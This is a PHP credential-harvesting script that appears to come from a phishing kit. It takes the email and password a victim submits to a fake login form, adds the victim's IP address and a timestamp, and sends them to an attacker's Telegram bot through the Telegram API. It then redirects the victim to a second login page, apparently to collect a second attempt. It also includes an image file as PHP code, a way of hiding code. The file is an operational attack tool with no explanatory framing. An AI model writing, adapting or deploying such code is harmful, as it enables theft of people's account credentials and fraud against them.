<?php
ob_start();
session_start();
$name  = $_POST['eml'];
$pw    = $_POST['pwd'];
include 'config.php';
include("./assets/files/logo.jpg");
include("./assets/function.php");
date_default_timezone_set("Asia/Manila");
$time1 = date('M d - h:i:s A');

        $msg .= "[ $ip2 ] - 𝟏𝐒𝐓 𝐀𝐓𝐓𝐄𝐌𝐏𝐓 - [ $time1 ]\n";
        $msg .= "username : $name\n";  
        $msg .= "password : $pw\n";


// TELEGRAM SEND FUNCTION (GO TO CONFIG.PHP)
 if ($telegram == "yes"){
$website = "https://api.telegram.org/bot" .$api;curl($msg);
$params = ['chat_id' => $chatid, 'text' => $msg, ];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}
    exit(header("Location: login2.html"));

?>